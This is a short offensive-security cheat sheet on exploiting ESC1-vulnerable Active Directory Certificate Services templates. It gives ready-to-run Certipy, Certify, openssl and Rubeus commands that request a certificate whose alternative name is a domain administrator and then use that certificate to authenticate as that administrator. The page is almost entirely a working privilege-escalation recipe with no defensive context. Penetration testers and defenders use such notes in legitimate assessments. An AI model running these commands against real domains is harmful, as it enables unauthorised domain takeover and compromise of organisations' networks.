# ADCS Vunerable Templates Exploitation - ESC1

## ADCS Vunerable Templates Exploitation - ESC1 [t-ad-adcs-adcs_esc1]

### Overview

Exploit templates with allowed custom SAN (ESC1)

### 1.1 Request a certificate with a custom SAN with a domain admin account




**option 1: certipy**

{% code overflow="wrap" %}
```bash
certipy req -username user@domain.com -password 'P@ssw0rd' -ca <company-DC-CA> -target <adcs.domain.com> -template <Vuln_Template_Name> -upn administrator@domain.com -dns dc1.domain.com
```
{% endcode %}


**option 2: certify**

{% code overflow="wrap" %}
```bash
Certify.exe request /ca:dc-2.dev.cyberbotic.io\sub-ca /template:CustomUser /altname:nlamb
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

```
{% endcode %}

### 1.2 Use the certificate




**option 1: certipy**

{% code overflow="wrap" %}
```bash
certipy auth -pfx administrator.pfx -dc-ip <dc_ip>
```
{% endcode %}


**option 2: Rubeus**

{% code overflow="wrap" %}
```bash
Rubeus.exe asktgt /user:nlamb /certificate:MIIM7w[...]ECAggA /password:pass123 /nowrap
```
{% endcode %}

